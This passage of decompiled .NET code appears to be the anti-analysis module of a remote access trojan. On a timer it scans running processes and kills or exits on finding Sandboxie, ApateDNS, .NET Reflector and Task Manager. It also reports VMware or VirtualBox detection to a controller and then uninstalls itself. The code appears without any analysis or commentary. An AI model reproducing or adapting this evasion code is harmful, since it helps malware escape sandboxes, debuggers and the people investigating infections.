						num46++;
						goto IL_0bc8;
						IL_0c0d:
						num = 191;
						processes16 = Process.GetProcesses();
						num47 = 0;
						goto IL_0c1d;
						IL_0c1d:
						if (num47 < processes16.Length)
						{
							process40 = processes16[num47];
							goto IL_0c2e;
						}
						goto IL_0c5a;
						IL_00e0:
						num = 15;
						process4.Kill();
						goto IL_00ea;
						IL_0c2e:
						num = 192;
						if (process40.MainWindowTitle.Contains("Sandboxie Control"))
						{
							ProjectData.EndApp();
						}
						goto IL_0c4c;
						IL_00ea:
						num = 16;
						num8++;
						goto IL_00f3;
						IL_0c4c:
						num = 194;
						num47++;
						goto IL_0c1d;
						IL_0c5a:
						num = 195;
						processes17 = Process.GetProcesses();
						num48 = 0;
						goto IL_0c6a;
						IL_0c6a:
						if (num48 < processes17.Length)
						{
							process41 = processes17[num48];
							goto IL_0c7b;
						}
						goto IL_0caf;
						IL_0413:
						num = 67;
						process16.Kill();
						goto IL_041d;
						IL_0c7b:
						num = 196;
						if (process41.MainWindowTitle.Contains("ApateDNS"))
						{
							goto IL_0c94;
						}
						goto IL_0ca1;
						IL_0c94:
						num = 197;
						process41.Kill();
						goto IL_0ca1;
						IL_0ca1:
						num = 199;
						num48++;
						goto IL_0c6a;
						IL_0caf:
						num = 200;
						processes18 = Process.GetProcesses();
						num49 = 0;
						goto IL_0cbf;
						IL_0cbf:
						if (num49 < processes18.Length)
						{
							process42 = processes18[num49];
							goto IL_0cd0;
						}
						goto end_IL_0001_2;
						IL_00ab:
						num = 12;
						num7++;
						goto IL_00b4;
						IL_0cd0:
						num = 201;
						if (process42.MainWindowTitle.Contains(".NET Reflector"))
						{
							goto IL_0ce9;
						}
						goto IL_0cf6;
						IL_0ce9:
						num = 202;
						process42.Kill();
						goto IL_0cf6;
						IL_0cf6:
						num = 204;
						num49++;
						goto IL_0cbf;
						IL_021b:
						num = 35;
						process9.Kill();
						goto IL_0225;
						IL_075c:
						num = 119;
						process25.Kill();
						goto IL_0766;
						IL_0766:
						num = 120;
						num32++;
						goto IL_076f;
						IL_0395:
						num = 59;
						process14.Kill();
						goto IL_039f;
						IL_071d:
						num = 115;
						process24.Kill();
						goto IL_0727;
						IL_0727:
						num = 116;
						num31++;
						goto IL_0730;
						IL_0264:
						num = 40;
						num14++;
						goto IL_026d;
						IL_06de:
						num = 111;
						process23.Kill();
						goto IL_06e8;
						IL_06e8:
						num = 112;
						num30++;
						goto IL_06f1;
						IL_025a:
						num = 39;
						process10.Kill();
						goto IL_0264;
						IL_069f:
						num = 107;
						process22.Kill();
						goto IL_06a9;
						IL_06a9:
						num = 108;
						num29++;
						goto IL_06b2;
						IL_039f:
						num = 60;
						num19++;
						goto IL_03a8;
						IL_0660:
						num = 103;
						process21.Kill();
						goto IL_066a;
						IL_066a:
						num = 104;
						num28++;
						goto IL_0673;
						IL_02a3:
						num = 44;
						num15++;
						goto IL_02ac;
						IL_0621:
						num = 99;
						process20.Kill();
						goto IL_062b;
						IL_062b:
						num = 100;
						num27++;
						goto IL_0634;
						IL_0299:
						num = 43;
						process11.Kill();
						goto IL_02a3;
						IL_05e2:
						num = 95;
						process19.Kill();
						goto IL_05ec;
						IL_05ec:
						num = 96;
						num26++;
						goto IL_05f5;
						IL_057e:
						num = 89;
						Core.Send("MSG" + Core.Y + "AntiProcess: VirtrualBox was detected! I deleted myself");
						goto IL_059b;
						IL_059b:
						num = 90;
						Thread.Sleep(20);
						goto IL_05a5;
						IL_05a5:
						num = 91;
						Core.UNS();
						goto IL_05ad;
						IL_05ad:
						num = 92;
						num25++;
						goto IL_05b6;
						IL_0525:
						num = 84;
						Core.Send("MSG" + Core.Y + "AntiProcess: VMware was detected! I deleted myself");
						goto IL_0542;
						IL_0542:
						num = 85;
						Thread.Sleep(500);
						goto IL_054f;
						IL_054f:
						num = 86;
						Core.UNS();
						goto IL_0557;
						IL_0557:
						num = 87;
						num24++;
						goto IL_0560;
						IL_0360:
						num = 56;
						num18++;
						goto IL_0369;
						IL_04d0:
						num = 79;
						Core.Send("MSG" + Core.Y + "AntiProcess: Task Manager was detected!");
						goto IL_04ed;
						IL_04ed:
						num = 80;
						process18.Kill();
						goto IL_04f7;
						IL_04f7:
						num = 81;
						num23++;
						goto IL_0500;
						IL_02e2:
						num = 48;
						num16++;
						goto IL_02eb;
						IL_0491:
						num = 75;
						process17.Kill();
						goto IL_049b;
						IL_049b:
						num = 76;
						num22++;
						goto IL_04a4;
						IL_02d8:
						num = 47;
						process12.Kill();
						goto IL_02e2;
						end_IL_0001:
						break;
					}
				}
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0001_dispatch = 4173;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001_2:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	public static void Start()
	{
		Timer = new System.Timers.Timer(1000.0);
		Timer.Elapsed += Handler;
		Timer.Enabled = true;
	}

	public static void stopme()
	{
		try
		{
			Timer.Elapsed += Handler;
			Timer.Stop();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}
}
